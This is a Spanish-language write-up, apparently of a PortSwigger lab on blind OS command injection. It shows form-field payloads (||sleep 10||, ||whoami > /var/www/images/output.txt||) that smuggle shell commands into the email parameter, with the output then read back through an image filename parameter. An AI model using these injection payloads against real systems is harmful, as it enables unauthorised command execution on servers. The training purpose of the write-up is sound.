---
title: "Blind OS command injection with output redirection"
description: "Laboratorio de Portswigger sobre OS Command Injection"
date: 2024-12-01 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - OS Command Injection
tags:
  - Portswigger Labs
  - OS Command Injection
  - Blind OS command injection with output redirection
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `Blind OS Command Injection` en la `función` de `comentarios`. La aplicación `ejecuta` un `comando` en la `terminal` que incluye `datos` proporcionados por el `usuario`. La `salida` del `comando` no se `devuelve` en la respuesta. Sin embargo, podemos usar la `redirección` de `salida` para capturarla. Existe una `carpeta` escribible en: `/var/www/images/`. La aplicación `sirve` las `imágenes` del catálogo de productos desde esta `ubicación`. Podemos `redireccionar` la `salida` del `comando` inyectado a un `archivo` en esta `carpeta` y luego usar la `URL` de `carga` de imágenes para `recuperar` el contenido del `archivo`. Para resolver el `laboratorio`, debemos ejecutar el comando `whoami` y `recuperar` su `salida`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/OS-Command-Injection-Lab-3/image_1.png)

Pulsamos en `Submit feedback` y vemos un `formulario`

![](/assets/img/OS-Command-Injection-Lab-3/image_2.png)

Hacemos `click` sobre `Submit feedback` y `capturamos` la `petición` con `Burpsuite`

![](/assets/img/OS-Command-Injection-Lab-3/image_3.png)

La `respuesta` obtenida son unas `llaves vacías {}`

![](/assets/img/OS-Command-Injection-Lab-3/image_4.png)

Si usamos este payload `|` en el campo email, en vez de `{}` en el `output` vemos un `mensaje` de `Could not save`

```
csrf=ZhcxbGtPNDRaQXlONDnnGJafoRTWN6uI&name=test&email=|test%40gmail.com&subject=test&message=test
```

Usando este `payload` se `ejecuta` el comando `sleep`

```
csrf=ZhcxbGtPNDRaQXlONDnnGJafoRTWN6uI&name=test&email=||sleep+10||&subject=test&message=test
```

Con este `payload` estamos `escribiendo` el `output` de nuestro `comando` en `/var/www/images`

```
csrf=ZhcxbGtPNDRaQXlONDnnGJafoRTWN6uI&name=test&email=||whoami+>+/var/www/images/output.txt||&subject=test&message=test
```

Si pulsamos `Ctrl + U` nos damos cuenta de que las `imágenes` están siendo `cargadas` a través de un `parámetro filename`

![](/assets/img/OS-Command-Injection-Lab-3/image_5.png)

Si accedemos a `https://0aa800dd041cfe318091ada900180005.web-security-academy.net/image?filename=output.txt` veremos el `output` de nuestro `comando`

![](/assets/img/OS-Command-Injection-Lab-3/image_6.png)
